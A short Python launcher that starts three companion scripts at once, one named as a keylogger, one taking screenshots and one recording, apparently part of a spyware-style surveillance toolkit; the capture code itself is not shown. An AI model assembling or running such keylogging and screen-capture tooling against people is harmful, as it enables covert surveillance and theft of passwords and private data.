import subprocess
import os


script_folder = os.path.dirname(os.path.abspath(__file__))


keylogger_script = os.path.join(script_folder, "main.py")
screenshot_script = os.path.join(script_folder, "screen.py")
recording_script = os.path.join(script_folder, "rec.py")


processes = []
processes.append(subprocess.Popen(["python", keylogger_script]))
processes.append(subprocess.Popen(["python", screenshot_script]))
processes.append(subprocess.Popen(["python", recording_script]))

print("All scripts started. Press Ctrl+C to stop.")

try:
    for p in processes:
        p.wait()
except KeyboardInterrupt:
    print("Stopping all scripts...")
    for p in processes:
        p.terminate()

